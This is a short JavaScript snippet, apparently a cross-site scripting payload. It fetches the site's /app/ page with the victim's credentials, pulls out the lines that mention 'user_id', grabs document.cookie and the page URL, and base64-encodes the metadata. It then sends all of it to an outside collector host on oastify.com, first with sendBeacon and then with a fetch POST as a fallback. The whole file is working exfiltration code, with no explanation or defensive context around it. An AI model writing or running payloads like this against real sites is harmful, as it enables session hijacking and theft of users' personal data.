(async () => {
  const TARGET = window.location.origin + "/app/";
  const COLLECT_BASE = "https://9eo1avfkp36tcxhc41kcatpuul0co3srh.oastify.com/collect";

  try {
    const r = await fetch(TARGET, { method: "GET", credentials: "include" });
    const text = await r.text();
    const lines = text.split(/\r?\n/);

    const hits = lines.filter(l => /user_id/i.test(l));
    if (!hits.length) {
      console.log("no lines containing 'user_id' found. Response length:", text.length);
      return;
    }

    const bodyPayload = hits.join("\n");
    console.log("Found", hits.length, "line(s). Body len:", bodyPayload.length);

    const cookies = document.cookie || "";
    const meta = {
      cookies: cookies,
      page: location.href,
      ts: new Date().toISOString()
    };
    const metaJson = JSON.stringify(meta);

    const metaB64 = btoa(unescape(encodeURIComponent(metaJson)));

    const MAX_COOKIE_QS_LEN = 1900;
    let finalMetaB64 = metaB64;
    if (metaB64.length > MAX_COOKIE_QS_LEN) {
      const truncated = Object.assign({}, meta, { cookies: cookies.slice(0, 1000) });
      finalMetaB64 = btoa(unescape(encodeURIComponent(JSON.stringify(truncated))));
      console.warn("Meta base64 was long; cookies were truncated in the URI.");
    }

    const qs = new URLSearchParams({ payload_b64: finalMetaB64 });
    const collectUrl = COLLECT_BASE + "?" + qs.toString();

    try {
      const ok = navigator.sendBeacon(collectUrl, new Blob([bodyPayload], { type: "text/plain;charset=UTF-8" }));
      console.log("sendBeacon -> url len:", collectUrl.length, "returned:", ok);
      if (ok) return;
      console.warn("sendBeacon returned false — falling back to fetch POST");
    } catch (e) {
      console.warn("sendBeacon threw:", e);
    }

    try {
      const resp = await fetch(collectUrl, {
        method: "POST",
        credentials: "omit",
        headers: { "Content-Type": "text/plain;charset=UTF-8" },
        body: bodyPayload
      });
      console.log("Fallback fetch status:", resp.status, resp.statusText);
    } catch (e) {
      console.error("Fallback fetch error:", e);
    }
  } catch (err) {
    console.error("Fetch error:", err);
  }
})();
